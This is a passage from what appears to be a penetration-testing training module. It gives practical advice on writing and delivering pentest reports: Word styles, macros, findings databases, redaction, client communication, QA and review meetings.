<li>The primary thing you want to use custom language settings for is most likely to apply it to the font style you created for your code/terminal/text-based evidence (you did create one, right?). You can select the option to ignore spelling and grammar checking within the language settings for this (or any) font style. This is helpful because after you build a report with a bunch of figures in it and you want to run the spell checker tool, you don&#39;t have to click ignore a billion times to skip all the stuff in your figures.</li>
</ul>
</li>
<li><code>Custom Bullet/Numbering</code><ul>
<li>You can set up custom numbering to automatically number things like your findings, appendices, and anything else that might benefit from automatic numbering.</li>
</ul>
</li>
<li><code>Quick Access Toolbar Setup</code><ul>
<li>There are many options and functions you can add to your Quick Access Toolbar that you should peruse at your leisure to determine how useful they will be for your workflow, but we&#39;ll list a few handy ones here. Select <code>File &gt; Options &gt; Quick Access Toolbar</code> to get to the config.</li>
<li>Back - It&#39;s always good to click on hyperlinks you create to ensure they send you to the right place in the document. The annoying part is getting back to where you were when you clicked so you can keep working. This button takes care of that.</li>
<li>Undo/Redo - This is only useful if you don&#39;t use the keyboard shortcuts instead.</li>
<li>Save - Again, useful if you don&#39;t use the keyboard shortcut instead.</li>
<li>Beyond this, you can set the &quot;Choose commands from:&quot; dropdown to &quot;Commands Not in the Ribbon&quot; to browse the functions that are more difficult to perform.</li>
</ul>
</li>
<li><code>Useful Hotkeys</code><ul>
<li>F4 will apply the last action you took again. For example, if you highlight some text and apply a font style to it, you can highlight something else to which you want to apply the same font style and just hit F4, which will do the same thing.</li>
<li>If you&#39;re using a ToC and lists of figures and tables, you can hit Ctrl+A to select all and F9 to update all of them simultaneously. This will also update any other &quot;fields&quot; in the document and sometimes does not work as planned, so use it at your own risk.</li>
<li>A more commonly known one is Ctrl+S to save. I just mention it here because you should be doing it often in case Word crashes, so you don&#39;t lose data.</li>
<li>If you need to look at two different areas of the report simultaneously and don&#39;t want to scroll back and forth, you can use Ctrl+Alt+S to split the window into two panes.</li>
<li>This may seem like a silly one, but if you accidentally hit your keyboard and you have no idea where your cursor is (or where you just inserted some rogue character or accidentally typed something unprofessional into your report instead of Discord), you can hit Shift+F5 to move the cursor to where the last revision was made.</li>
<li>There are many more listed <a href="https://support.microsoft.com/en-us/office/keyboard-shortcuts-in-word-95ef89dd-7142-4b50-afb2-f762f663ceb2">here</a>, but these are the ones that I&#39;ve found have been the most useful that aren&#39;t also obvious.</li>
</ul>
</li>
</ul>
<hr>
<h3 id="automation">Automation</h3>
<p>When developing report templates, you may get to a point where you have a reasonably mature document but not enough time or budget to acquire an automated reporting platform. A lot of automation can be gained through macros in MS Word documents. You will need to save your templates as .dotm files, and you will need to be in a Windows environment to get the most out of this (Mac Word&#39;s VB Editor may as well not exist). Some of the most common things you can do with macros are:</p>
<ul>
<li>Create a macro that will throw a pop-up for you to enter key pieces of information that will then get automatically inserted into the report template where designated placeholder variables are:<ul>
<li>Client name</li>
<li>Dates</li>
<li>Scope details</li>
<li>Type of testing</li>
<li>Environment or application names</li>
</ul>
</li>
<li>You can combine different report templates into a single document and have a macro go through and remove entire sections (that you designate via bookmarks) that don&#39;t belong in a particular assessment type.<ul>
<li>This eases the task of maintaining your templates since you only have to maintain one instead of many</li>
</ul>
</li>
<li>You may also be able to automate quality assurance tasks by correcting errors made often. Given that writing Word macros is basically a programming language on its own (and could be a course all by itself), we leave it to the reader to use online resources to learn how to accomplish these tasks.</li>
</ul>
<hr>
<h3 id="reporting-tools-findings-database">Reporting Tools/Findings Database</h3>
<p>Once you do several assessments, you&#39;ll start to notice that many of the environments you target are afflicted by the same problems. If you do not have a database of findings, you&#39;ll waste a tremendous amount of time rewriting the same content repeatedly, and you risk introducing inconsistencies in your recommendations and how thoroughly or clearly you describe the finding itself. If you multiply these issues by an entire team, the quality of your reports will vary wildly from one consultant to the next. At a minimum, you should maintain a dedicated document with sanitized versions of your findings that you can copy/paste into your reports. As discussed previously, we should constantly strive to customize findings to a client environment whenever it makes sense but having templated findings saves a ton of time.</p>
<p>However, it is time well spent to investigate and configure one of the available platforms designed for this purpose. Some are free, and some must be paid for, but they will most likely pay for themselves quickly in the amount of time and headache you save if you can afford the initial investment.</p>
<table>
<thead>
<tr>
<th><strong>Free</strong></th>
<th><strong>Paid</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td><a href="https://github.com/GhostManager/Ghostwriter">Ghostwriter</a></td>
<td><a href="https://attackforge.com/">AttackForge</a></td>
</tr>
<tr>
<td><a href="https://dradisframework.com/ce/">Dradis</a></td>
<td><a href="https://plextrac.com/">PlexTrac</a></td>
</tr>
<tr>
<td><a href="https://github.com/SecurityRiskAdvisors/VECTR">Security Risk Advisors VECTR</a></td>
<td><a href="https://www.rootshellsecurity.net/why-prism/">Rootshell Prism</a></td>
</tr>
<tr>
<td><a href="https://github.com/blacklanternsecurity/writehat">WriteHat</a></td>
</tr>
</tbody>
</table>
<hr>
<h3 id="misc-tips-tricks">Misc Tips/Tricks</h3>
<p>Though we&#39;ve covered some of these in other module sections, here is a list of tips and tricks that you should keep close by:</p>
<ul>
<li>Aim to tell a story with your report. Why does it matter that you could perform Kerberoasting and crack a hash? What was the impact of default creds on X application?</li>
<li>Write as you go. Don&#39;t leave reporting until the end. Your report does not need to be perfect as you test but documenting as much as you can as clearly as you can during testing will help you be as comprehensive as possible and not miss things or cut corners while rushing on the last day of the testing window.</li>
<li>Stay organized. Keep things in chronological order, so working with your notes is easier. Make your notes clear and easy to navigate, so they provide value and don&#39;t cause you extra work.</li>
<li>Show as much evidence as possible while not being overly verbose. Show enough screenshots/command output to clearly demonstrate and reproduce issues but do not add loads of extra screenshots or unnecessary command output that will clutter up the report.</li>
<li>Clearly show what is being presented in screenshots. Use a tool such as <a href="https://getgreenshot.org/">Greenshot</a> to add arrows/colored boxes to screenshots and add explanations under the screenshot if needed. A screenshot is useless if your audience has to guess what you&#39;re trying to show with it.</li>
<li>Redact sensitive data wherever possible. This includes cleartext passwords, password hashes, other secrets, and any data that could be deemed sensitive to our clients. Reports may be sent around a company and even to third parties, so we want to ensure we&#39;ve done our due diligence not to include any data in the report that could be misused. A tool such as <code>Greenshot</code> can be used to obfuscate parts of a screenshot (using solid shapes and not blurring!).</li>
<li>Redact tool output wherever possible to remove elements that non-hackers may construe as unprofessional (i.e., <code>(Pwn3d!)</code> from CrackMapExec output). In CME&#39;s case, you can change that value in your config file to print something else to the screen, so you don&#39;t have to change it in your report every time. Other tools may have similar customization.</li>
<li>Check your Hashcat output to ensure that none of the candidate passwords is anything crude. Many wordlists will have words that can be considered crude/offensive, and if any of these are present in the Hashcat output, change them to something innocuous. You may be thinking, &quot;they said never to alter command output.&quot; The two examples above are some of the few times it is OK. Generally, if we are modifying something that can be construed as offensive or unprofessional but not changing the overall representation of the finding evidence, then we are OK, but take this on a case-by-case basis and raise issues like this to a manager or team lead if in doubt.</li>
<li>Check grammar, spelling, and formatting, ensure font and font sizes are consistent and spell out acronyms the first time you use them in a report.</li>
<li>Make sure screenshots are clear and do not capture extra parts of the screen that bloat their size. If your report is difficult to interpret due to poor formatting or the grammar and spelling are a mess, it will detract from the technical results of the assessment. Consider a tool such as Grammarly or LanguageTool (but be aware these tools may ship some of your data to the cloud to &quot;learn&quot;), which is much more powerful than Microsoft Word&#39;s built-in spelling and grammar check.</li>
<li>Use raw command output where possible, but when you need to screenshot a console, make sure it&#39;s not transparent and showing your background/other tools (this looks terrible). The console should be solid black with a reasonable theme (black background, white or green text, not some crazy multi-colored theme that will give the reader a headache). Your client may print the report, so you may want to consider a light background with dark text, so you don&#39;t demolish their printer cartridge.</li>
<li>Keep your hostname and username professional. Don&#39;t show screenshots with a prompt like <code>azzkicker@clientsmasher</code>.</li>
<li>Establish a QA process. Your report should go through at least one, but preferably two rounds of QA (two reviewers besides yourself). We should never review our own work (wherever possible) and want to put together the best possible deliverable, so pay attention to the QA process. At a minimum, if you&#39;re independent, you should sleep on it for a night and review it again. Stepping away from the report for a while can sometimes help you see things you overlook after staring at it for a long time.</li>
<li>Establish a style guide and stick to it, so everyone on your team follows a similar format and reports look consistent across all assessments.</li>
<li>Use autosave with your notetaking tool and MS Word. You don&#39;t want to lose hours of work because a program crashes. Also, backup your notes and other data as you go, and don&#39;t store everything on a single VM. VMs can fail, so you should move evidence to a secondary location as you go. This is a task that can and should be automated.</li>
<li>Script and automate wherever possible. This will ensure your work is consistent across all assessments you perform, and you don&#39;t waste time on tasks repeated on every assessment.</li>
</ul>
<hr>
<h3 id="client-communication">Client Communication</h3>
<p>Strong written and verbal communication skills are paramount for anyone in a penetration testing role. During our engagements (from scoping until final report delivery and review), we must remain in constant contact with our clients and serve appropriately in our role as trusted advisors. They are hiring our company and paying a lot of money for us to identify issues in their networks, give remediation advice, and also to educate their staff on the issues we find through our report deliverable. At the start of every engagement, we should send a <code>start notification</code> email including information such as:</p>
<ul>
<li>Tester name</li>
<li>Description of the type/scope of the engagement</li>
<li>Source IP address for testing (public IP for an external attack host or the internal IP of our attack host if we are performing an Internal Penetration Test)</li>
<li>Dates anticipate for testing</li>
<li>Primary and secondary contact information (email and phone)</li>
</ul>
<p>At the end of each day, we should send a stop notification to signal the end of testing. This can be a good time to give a high-level summary of findings (especially if the report will have 20+ high-risk findings) so the report does not entirely blindside the client. We can also reiterate expectations for report delivery at this time. We should, of course, be working on the report as we go and not leave it 100% to the last minute, but it can take a few days to write up the entire attack chain, executive summary, findings, recommendations, and perform self-QA checks. After this, the report should go through at least one round of internal QA (and the people responsible for QA probably have lots of other things to do), which can take some time.</p>
<p>The start and stop notifications also give the client a window for when your scans and testing activities were taking place in case they need to run down any alerts.</p>
<p>Aside from these formal communications, it is good to keep an open dialogue with our clients and build and strengthen the trusted advisor relationship. Did you discover an additional external subnet or subdomain? Check with the client to see if they&#39;d like to add it to the scope (within reason and provided it does not exceed the time allotted for testing). Did you discover a high-risk SQL injection or remote code execution flaw on an external website? Stop testing and formally notify the client and see how they would like to proceed. A host seems down from scanning? It happens, and it&#39;s best to be upfront about it than try to hide it. Got Domain Admin/Enterprise Admin? Give the client a heads up in case they see alerts and get nervous or so they can prepare their management for the pending report. Also, at this point, let them know that you will keep testing and looking for other paths but ask them if there is anything else they&#39;d like you to focus on or servers/databases that should still be limited even with DA privileges that you can target.</p>
<p>We should also discuss the importance of detailed notes and scanner logging/tool output. If your client asks if you hit a specific host on X day, you should be able to, without a doubt, provide documented evidence of your exact activities. It stinks to get blamed for an outage, but it&#39;s even worse if you get blamed for one and have zero concrete evidence to prove that it was not a result of your testing.</p>
<p>Keeping these communication tips in mind will go a long way towards building goodwill with your client and winning repeat business and even referrals. People want to work with others who treat them well and work diligently and professionally, so this is your time to shine. With excellent technical skills and communication skills, you will be unstoppable!</p>
<hr>
<h3 id="presenting-your-report-the-final-product">Presenting Your Report - The Final Product</h3>
<p>Once the report is ready, it needs to go through review before delivery. Once delivered, it is customary to provide the client with a report review meeting to either go over the entire report, the findings alone, or answer questions that they may have.</p>
<p><strong>QA Process</strong></p>
<p>A sloppy report will call into question everything about our assessment. If our report is a disorganized mess, is it even possible that we performed a thorough assessment? Were we careless and left a trail of destruction in our wake that the client will have to spend time they don&#39;t have to clean up? Let&#39;s ensure our report deliverable is a testament to our hard-earned knowledge and hard work on the assessment and adequately reflects both. The client isn&#39;t going to see most of what you did during the assessment.</p>
<p><code>The report is your highlight reel and is honestly what the client is paying for!</code></p>
<p>You could have executed the most complex awesome attack chain in the history of attack chains, but if you can&#39;t get it on paper in a way that someone else can understand, it may as well have never happened at all.</p>
<p>If possible, every report should undergo at least one round of QA by someone who isn&#39;t the author. Some teams may also opt to break up the QA process into multiple steps (e.g., QA for technical accuracy and then QA for proper styling and cosmetics). It will be up to you, your team, or your organization to choose the right approach that works for the size of your team. If you are just starting on your own and don&#39;t have the luxury of having someone else review your report, I would strongly recommend walking away from it for a while or sleeping on it and reviewing it again at a minimum. Once you read through a document 45 times, you start overlooking things. This mini-reset can help you catch things you didn&#39;t see after you had been staring at it for days.</p>
<p>It is good practice to include a QA checklist as part of your report template (remove it once the report is final). This should consist of all the checks the author should make regarding content and formatting and anything else that you may have in your style guide. This list will likely grow over time as you and your team&#39;s processes are refined, and you learn which mistakes people are most prone to making. Make sure that you check grammar, spelling, and formatting! A tool such as Grammarly or LanguageTool is excellent for <code>this</code> (but make sure you have approval). Don&#39;t send a sloppy report to QA because it may get kicked back to you to fix before the reviewer even looks at it, and it can be a costly waste of time for you and others.</p>
<p>A quick note about online grammar correction tools: As a means to &quot;learn&quot; more and improve the accuracy of the tool, these will often send pieces of whatever data it&#39;s reading back &quot;home&quot;, which means if you&#39;re writing a report with confidential client vulnerability data in it, you might be breaching some sort of MSA or something unwittingly. Before using tools like this, it&#39;s important to look into their functionality and whether this sort of behavior can be disabled.</p>
<p>If you have access to someone that can perform QA and you begin trying to implement a process, you may soon find that as the team grows and the number of reports being output increases, things can get difficult to track. At a basic level, a Google Sheet or some equivalent could be used to help make sure things don&#39;t get lost, but if you have many more people (like consultants AND PMs) and you have access to a tool like Jira, that could be a much more scalable solution. You&#39;ll likely need a central place to store your reports so that other people can get to them to perform the QA process. There are many out there that would work, but choosing the best one is outside the scope of this course.</p>
<p>Ideally, the person performing QA should NOT be responsible for making significant modifications to the report. If there are minor typos, phrasing, or formatting issues to address that can be done more quickly than sending the report back to the author to change, that&#39;s likely fine. For missing or poorly illustrated evidence, missing findings, unusable executive summary content, etc., the author should bear the responsibility for getting that document into presentable condition.</p>
<p>You obviously want to be diligent about reviewing the changes made to your report (turn Track Changes on!) so that you can stop making the same mistakes in subsequent reports. It&#39;s absolutely a learning opportunity, so don&#39;t squander it. If it&#39;s something that happens across multiple people, you may want to consider adding that item to your QA checklist to remind people to address those issues before sending reports to QA. There aren&#39;t many better feelings in this career than when the day comes that a report you wrote gets through QA without any changes.</p>
<p>It may be considered strictly a formality, but it&#39;s reasonably common to initially issue a &quot;Draft&quot; copy of the report to the client once the QA process has been completed. Once the client has the draft report, they should be expected to review it and let you know whether they would like an opportunity to walk through the report with you to discuss modifications and ask questions. If any changes or updates need to be made to the report after this conversation, they can be made to the report and a &quot;Final&quot; version issued. The final report is often going to be identical to the draft report (if the client does not have any changes that need to be made), but it will just say &quot;Final&quot; instead of &quot;Draft .&quot;It may seem frivolous, but some auditors will only consider accepting a final report as an artifact, so it could be quite important to some clients.</p>
<hr>
<h3 id="report-review-meeting">Report Review Meeting</h3>
<p>Once the report has been delivered, it’s fairly customary to give the client a week or so to review the report, gather their thoughts, and offer to have a call to review it with them to collect any feedback they have on your work. Usually, this call covers the technical finding details one by one and allows the client to ask questions about what you found and how you found it. These calls can be immensely helpful in improving your ability to present this type of data, so pay careful attention to the conversation. If you find yourself answering the same questions every time, that could indicate that you need to tweak your workflow or the information you provide to help answer those questions before the client asks them.</p>
<p>Once the report has been reviewed and accepted by both sides, it is customary to change the <code>DRAFT</code> designation to <code>FINAL</code> and deliver the final copy to the client. From here, we should archive all of our testing data per our company&#39;s retention policies until a retest of remediated findings is performed at the very least.</p>
<hr>
<h3 id="wrap-up">Wrap Up</h3>
<p>These are just some tips and tricks we have collected over the years. Many of these are common sense. This <a href="https://blackhillsinfosec.com/how-to-not-suck-at-reporting-or-how-to-write-great-pentesting-reports/">post</a> by the awesome team at Black Hills Information Security is worth a read. The goal here is to present the most professional deliverable possible while telling a clear story based on our hard work during a technical assessment. Put your best foot forward and create a deliverable you can be proud of. You spent many hours relentlessly pursuing Domain Admin. Apply that same zeal to your reporting, and you&#39;ll be a rockstar. In the last sections of this module, we&#39;ll discuss opportunities for practicing our documentation and reporting skills.</p>
